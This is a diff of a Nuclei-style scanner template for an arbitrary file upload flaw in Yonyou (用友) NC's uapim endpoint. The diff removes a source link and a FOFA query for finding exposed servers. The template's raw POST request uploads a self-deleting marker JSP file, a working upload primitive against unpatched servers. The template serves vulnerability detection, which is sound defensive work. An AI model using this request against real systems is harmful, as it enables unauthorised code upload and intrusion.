@@ -3,12 +3,8 @@ info:
   name: 用友NC uapim 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ptrbkq47vtxkg9el'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ptrbkq47vtxkg9el
-    fofa: app="用友-UFIDA-NC" || title="YONYOU NC"
 http:
 - raw:
   - 'POST /uapim/upload/grouptemplet?groupid=dudesuite&fileType=jsp HTTP/1.1
@@ -23,14 +19,10 @@ http:
     Connection: close
 
 
-
-
     --97jkbhjvvyhvhvuyvug97
 
 
     Content-Disposition: form-data; name="file"; filename="dudesuite.jsp"
-
-
 
 
     <% out.println("dudesuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
